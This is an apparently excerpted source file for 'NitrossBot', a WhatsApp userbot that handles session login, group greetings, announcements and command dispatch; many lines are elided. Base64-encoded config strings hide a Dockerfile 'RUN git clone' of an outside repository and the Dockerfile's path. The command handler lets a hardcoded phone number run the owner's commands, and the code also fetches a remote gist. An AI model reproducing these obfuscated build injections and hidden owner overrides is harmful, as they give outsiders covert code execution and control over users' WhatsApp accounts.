/* Copyright (C) 2021 NitrossRoboto.
...
const NitrossBotStack = require("@nitrossroboto/nitrossbot-npm-pkg");
...
async function NitrossBot() {
  var clh = {
    ...
    pay: "",
    exc: "UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcGhhdGljdXN0aGljY3kvV2hhdHNBc2VuYUR1cGxpY2F0ZWQgL3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQ=",
    exc_pl: "",
    pth_w: "L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl",
    pth_v: "",
  };
  ...
  clh.exc_pl = exc_fn;
  clh.pay = ddd;
  const NitrossBotCN = new WAConnection();
  const Session = new StringSession();
  NitrossBotCN.version = [2, 2126, 14];
  NitrossBotCN.setMaxListeners(0);
  var proxyAgent_var = "";
  if (config.PROXY.includes("https") || config.PROXY.includes("http")) {
    NitrossBotCN.connectOptions.agent = ProxyAgent(config.PROXY);
  }
  setInterval(async () => {
    ...
    while (getGMTh == 19 && getGMTm == 1) {
      ...
      if (ann.video.includes("http") || ann.video.includes("https")) {
        ...
        yt.on("end", async () => {
          return await NitrossBotCN.sendMessage(
            ...
            MessageType.video,
            {
              caption:
                ilan +
                ann_msg
                  .replace("{user}", NitrossBotCN.user.name)
                  .replace("{wa_version}", NitrossBotCN.user.phone.wa_version)
                  .replace("{version}", config.VERSION)
                  .replace("{os_version}", NitrossBotCN.user.phone.os_version)
                  .replace(
                    "{device_model}",
                    NitrossBotCN.user.phone.device_model
                  )
                  .replace(
                    "{device_brand}",
                    NitrossBotCN.user.phone.device_manufacturer
                  ),
        ...
        if (ann.image.includes("http") || ann.image.includes("https")) {
          var imagegen = await axios.get(ann.image, {
            responseType: "arraybuffer",
          });
          return await NitrossBotCN.sendMessage(
            NitrossBotCN.user.jid,
            Buffer.from(imagegen.data),
            MessageType.image,
            {
              caption:
                ilan +
          ...
          return await NitrossBotCN.sendMessage(
            ...
            ilan +
              ann_msg
                ...
                .replace("{version}", config.VERSION)
                .replace("{os_version}", NitrossBotCN.user.phone.os_version)
                .replace("{device_model}", NitrossBotCN.user.phone.device_model)
                .replace(
                  "{device_brand}",
                  NitrossBotCN.user.phone.device_manufacturer
                ),
  ...
  await axios
    .get(
      "https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/"
    )
    .then(async (insult) => {
  ...
  NitrossBotCN.logger.level = logger_levels;
  var nodb;
  if (StrSes_Db.length < 1) {
    nodb = true;
    NitrossBotCN.loadAuthInfo(Session.deCrypt(config.SESSION));
  } else {
    NitrossBotCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
  }
  NitrossBotCN.on("open", async () => {
    console.log(chalk.blueBright.italic("✅ Login Information Updated!"));
    const authInfo = NitrossBotCN.base64EncodedAuthInfo();
    if (StrSes_Db.length < 1) {
      await NitrossBotDB.create({
        info: "StringSession",
...
${chalk.blue.italic("ℹ️ Connecting to WhatsApp... Please Wait.")}`);
  ...
  NitrossBotCN.on("credentials-updated", async () => {
    ...
    let NitrossBot = config.WORKTYPE == "public" ? " Public" : " Private";
    console.log(chalk.bgGreen("🐺 NitrossBot" + NitrossBot));
    await new Promise((r) => setTimeout(r, 500));
    let EVA_ACTİON =
      config.LANG == "EN" || config.LANG == "SI"
        ? "**NitrossBot Working as a Chatbot! 🐺*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using NitrossBot 💌*\n    *- Eva*"
        : "*NitrossBot Working as a Chatbot! 🐺*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using NitrossBot 💌*\n    *- Eva*";
    if (
      NitrossBotCN.user.jid == one ||
      NitrossBotCN.user.jid == two ||
      NitrossBotCN.user.jid == three ||
      NitrossBotCN.user.jid == four ||
      NitrossBotCN.user.jid == five ||
      NitrossBotCN.user.jid == six ||
      NitrossBotCN.user.jid == seven ||
      NitrossBotCN.user.jid == eight
    ) {
  ...
  NitrossBotCN.on("message-new", async (msg) => {
    if (msg.key && msg.key.remoteJid == "status@broadcast") return;
    if (config.NO_ONLINE) {
      await NitrossBotCN.updatePresence(
        msg.key.remoteJid,
    ...
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
      ...
      if (gb !== false) {
        if (gb.message.includes("{gpp}")) {
          var ppUrl = await NitrossBotCN.getProfilePicture(msg.key.remoteJid);
          var nwjson = await NitrossBotCN.groupMetadata(msg.key.remoteJid);
          ...
          await NitrossBotCN.sendMessage(
            ...
            MessageType.image,
            {
              caption: gb.message
                .replace("{gpp}", "")
                .replace("{botowner}", NitrossBotCN.user.name)
                .replace("{gname}", nwjson.subject)
                .replace("{gowner}", nwjson.owner)
                .replace("{gdesc}", nwjson.desc),
            }
          );
        } else {
          var nwjson = await NitrossBotCN.groupMetadata(msg.key.remoteJid);
    ...
    if (config.BLOCKCHAT !== false) {
      ...
      if (
        msg.key.remoteJid.includes("-")
          ? abc.includes(msg.key.remoteJid.split("@")[0])
          : abc.includes(
              msg.participant
    ...
    if (config.SUPPORT == "905524317852-1612300121") {
      ...
      if (
        msg.key.remoteJid.includes("-")
          ? sup.includes(msg.key.remoteJid.split("@")[0])
          : sup.includes(
              msg.participant
                ? msg.participant.split("@")[0]
                : msg.key.remoteJid.split("@")[0]
    ...
    if (config.SUPPORT2 == "905511384572-1617736751") {
      ...
      if (
        msg.key.remoteJid.includes("-")
          ? tsup.includes(msg.key.remoteJid.split("@")[0])
          : tsup.includes(
              msg.participant
                ? msg.participant.split("@")[0]
                : msg.key.remoteJid.split("@")[0]
    ...
    if (config.SUPPORT3 == "905511384572-1621015274") {
      ...
      if (
        msg.key.remoteJid.includes("-")
          ? nsup.includes(msg.key.remoteJid.split("@")[0])
          : nsup.includes(
              msg.participant
                ? msg.participant.split("@")[0]
                : msg.key.remoteJid.split("@")[0]
    ...
    events.commands.map(async (command) => {
      ...
      if (
        ...
        let sendMsg = false;
        var chat = NitrossBotCN.chats.get(msg.key.remoteJid);
        ...
        if (
          (OWN.ff == "905511384572,0" &&
            msg.key.fromMe === false &&
            command.fromMe === true &&
            (msg.participant && OWN.ff.includes(",")
              ? OWN.ff.split(",").includes(msg.participant.split("@")[0])
              : msg.participant.split("@")[0] == OWN.ff || OWN.ff.includes(",")
              ? OWN.ff.split(",").includes(msg.key.remoteJid.split("@")[0])
              : msg.key.remoteJid.split("@")[0] == OWN.ff)) ||
          command.fromMe === msg.key.fromMe ||
          (command.fromMe === false && !msg.key.fromMe)
        ) {
          if (command.onlyPinned && chat.pin === undefined) return;
        ...
        if (sendMsg) {
          if (config.SEND_READ && command.on === undefined) {
            await NitrossBotCN.chatRead(msg.key.remoteJid);
          }
          ...
          if (
            ...
            whats = new Image(NitrossBotCN, msg);
          } else if (
            command.on !== undefined &&
            command.on === "video" &&
            msg.message.videoMessage !== null
          ) {
            whats = new Video(NitrossBotCN, msg);
          } else {
            whats = new Message(NitrossBotCN, msg);
          }
          if (msg.key.fromMe && command.deleteCommand) {
            var wrs = NitrossBotCN.user.phone.wa_version.split(".")[2];
          ...
          try {
            ...
            if (config.LANG == "TR" || config.LANG == "AZ") {
              ...
              if (error.message.includes("URL")) {
                ...
                return await NitrossBotCN.sendMessage(
                  NitrossBotCN.user.jid,
                  "*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*" +
